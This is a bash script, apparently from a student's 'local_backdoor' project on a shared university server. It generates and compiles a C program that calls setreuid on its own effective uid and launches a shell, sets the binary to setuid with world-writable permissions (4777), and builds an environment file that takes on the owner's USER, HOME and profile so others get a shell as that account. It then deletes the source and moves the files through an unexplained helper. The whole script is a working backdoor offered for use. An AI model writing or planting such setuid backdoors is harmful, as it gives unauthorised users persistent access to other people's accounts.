#!/bin/bash
USER=$(whoami)
# below settings must be modified!!!!!
workdir=/home/taeguk/local_backdoor/
exedir=/home/taeguk/local_backdoor/collection/bdfiles/
envdir=/home/taeguk/local_backdoor/collection/envfiles/
srcfile=$workdir$USER$1.c
bdfile=$workdir$USER$1.bd
envfile=$workdir$USER$1.env
exe_envfile=$envdir$USER$1.env
exe_bdfile=$exedir$USER$1.bd
movefile="$workdir"movefile.out

echo -e "#include <stdio.h>" > $srcfile
echo -e "#include <stdlib.h>" >> $srcfile
echo -e "#include <unistd.h>" >> $srcfile
echo -e "int main(int argc, char* argv[]){" >> $srcfile
echo -e "char a=10;setreuid(geteuid(),geteuid());printf(\"백도어 실행!!!%c\",a);" >> $srcfile
echo -e "system(\"/bin/bash $exe_envfile\");" >> $srcfile
echo -e "return 0;}" >> $srcfile
chmod 777 $srcfile

gcc -o $bdfile $srcfile
chmod 4777 $bdfile

touch $envfile
echo "if [ \"\$1\" == \"1\"  ];then" >> $envfile
echo "export USER=$USER" >> $envfile
#echo export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games >> $envfile
echo "export PATH=$PATH" >> $envfile
echo "export MAIL=/var/mail/$USER" >> $envfile
echo "export HOME=/sogang/under/$USER" >> $envfile
echo "export LOGNAME=$USER" >> $envfile
PROFILE=/sogang/under/$USER/.profile
COPY_PROFILE="$workdir"."$USER".profile
echo "cp $PROFILE $COPY_PROFILE" >> $envfile
echo "echo /bin/bash >> $COPY_PROFILE" >> $envfile
echo "/bin/bash $COPY_PROFILE" >> $envfile
echo "rm $COPY_PROFILE" >> $envfile

echo "else" >> $envfile
echo -e "/bin/bash $exe_envfile 1" >> $envfile
echo "echo -n \"if failed to connect? (Y/N)>> \"" >> $envfile
echo "read ans" >> $envfile
echo "if [ \"\$ans\" == \"Y\" ] || [ \"\$ans\" == \"y\" ];then" >> $envfile
echo "echo Trying old way..." >> $envfile
echo "/bin/bash" >> $envfile
echo "fi" >> $envfile
echo "fi" >> $envfile

chmod 777 $envfile

rm $srcfile
$movefile $bdfile $exe_bdfile $envfile $exe_envfile

if [ -f $exe_bdfile ];then
	chmod 4777 $exe_bdfile
fi
if [ -f $exe_envfile ];then
	chmod 777 $exe_envfile
fi

if [ -f $bdfile ];then
	rm $bdfile
fi
if [ -f $envfile ];then
	rm $envfile
fi
